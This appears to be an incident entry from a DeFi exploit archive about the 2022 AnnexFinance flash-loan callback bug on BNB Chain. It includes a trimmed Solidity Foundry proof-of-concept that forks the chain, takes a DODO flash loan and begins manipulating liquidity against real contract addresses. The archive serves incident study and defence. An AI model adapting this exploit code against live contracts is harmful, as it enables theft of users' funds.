# [?] - AnnexFinance - Verify flashLoan Callback

## Summary
Severity: Unknown
Chain: BNB Chain
Component: Annex
Published: 2022-11-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/Annex_exp.sol
Type: defi-exploit-poc

## Details
Lost: $3k
References:
- https://twitter.com/AnciliaInc/status/1593690338526273536
- https://bscscan.com/tx/0x3757d177482171dcfad7066c5e88d6f0f0fe74b28f32e41dd77137cad859c777

```solidity
contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Factory Factory = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
    address Token;
    uint256 WBNBAmount;
    address Pair;
    address constant dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    address constant Liquidator = 0xe65E970F065643bA80E5822edfF483A1d75263E3;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_165_446);
    }

    function testExploit() public {
        MyERC20 MyToken = new MyERC20();
        Token = address(MyToken);
        MyToken.mint(10 * 1e18);
        DVM(dodo).flashLoan(8 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        IERC20(Token).approve(address(Router), type(uint256).max);
        WBNB.approve(address(Router), type(uint256).max);
        Router.addLiquidity(
            address(Token), address(WBNB), 8 * 1e18, 8 * 1e18, 0, 0, address(this), block.timestamp + 60
        );
        Pair = Factory.getPair(Token, address(WBNB));
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/Annex_exp.sol_
